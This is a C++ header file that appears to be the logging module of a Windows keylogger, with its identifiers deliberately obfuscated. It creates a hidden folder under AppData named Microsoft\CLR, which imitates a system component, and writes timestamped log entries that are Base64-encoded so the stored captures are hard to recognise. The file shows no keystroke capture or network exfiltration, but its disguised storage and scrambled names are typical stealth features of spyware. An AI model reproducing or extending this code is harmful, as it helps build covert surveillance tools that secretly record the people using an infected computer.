#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include <fstream>
#include "windows.h"
#include "Helper.h"
#include "Base64.h"

namespace IO
{
    std::string AOcrFUixLaoDRfuIXlAOdrGUjxLaoD(const bool AOdsHWkzOdsHVkzOdsGVkzOdrGVkzNc = false)
    {
        std::string APetIXnCRgvLapETjyNcrHWlAPfuJYnC(getenv("APPDATA"));
        std::string full = APetIXnCRgvLapETjyNcrHWlAPfuJYnC + "\\Microsoft\\CLR";
        return full + (AOdsHWkzOdsHVkzOdsGVkzOdrGVkzNc ? "\\" : "");
    }

    bool APfuKZpEUkzPeuJZoEUjzOetJYoETjyOd(std::string path)
    {
        return (bool)CreateDirectory(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
    }

    bool APfvLbrHXnDTjzOeuKaqGWmCSiyNdtJZp(std::string path)
    {
        for(char &c : path)
        {
            if(c =='\\')
            {
                c='\0';
                if(!APfuKZpEUkzPeuJZoEUjzOetJYoETjyOd(path))
                    return false;
                c = '\\';
            }
        }
        return true;
    }

    template <class T>
    std::string AQgwNdtKaqGXnDUkAQhxNeuKbrHXoEUlBR(const T &t)
    {
        std::string path = AOcrFUixLaoDRfuIXlAOdrGUjxLaoD(true);
        Helper::DateTime dt;
        std::string name = dt.AMZmzMZmzMZmzMZmzMZmzMZmzMZ("_") + ".log";

        try
        {
            std::ofstream file(path + name);
            if(!file) return "";
            std::ostringstream s;
            s << "[" << dt.AMZmzMZmzMZmzMZmzMZmzMZmzMZ() << "]---" << t;
            std::string data = BASE64::ALXiuFRcozLWitFQcozLWitFQ(s.str());
            file << data;
            if(!file)
                return "";
            file.close();
            return name;
        }
        catch(...)
        {
            return "";
        }
    }

}


#endif // IO_H
